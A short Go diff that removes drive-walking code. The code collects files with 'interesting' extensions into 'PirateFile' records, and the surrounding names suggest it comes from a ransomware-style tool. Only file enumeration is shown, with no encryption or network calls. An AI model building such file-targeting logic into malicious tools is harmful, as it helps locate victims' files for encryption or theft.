@@ -4,8 +4,6 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"os"
-	"path/filepath"
-	"strings"
 )
 
 // Check if a value exists on slice
@@ -37,31 +35,4 @@ func getDrives() (drives []string) {
 		}
 	}
 	return drives
-}
-
-func walkDrive(path string, f os.FileInfo, err error) error {
-	if f.IsDir() {
-		for _, skipDir := range SkippedDirs {
-			if strings.Contains(filepath.Base(path), skipDir) {
-				return filepath.SkipDir
-			}
-		}
-	} else {
-		ext := strings.ToLower(filepath.Ext(path))
-		if len(ext) >= 2 && stringInSlice(ext[1:], InterestingExtensions) {
-			fileTracker.Files <- &PirateFile{
-				FileInfo: f,
-				Extension: ext[1:],
-				FullPath: path,
-			}
-		}
-	}
-	return nil
-}
-
-func walkDrives(dirs []string) {
-	for _, dir := range dirs {
-		filepath.Walk(dir, walkDrive)
-	}
-	close(fileTracker.Files)
 }
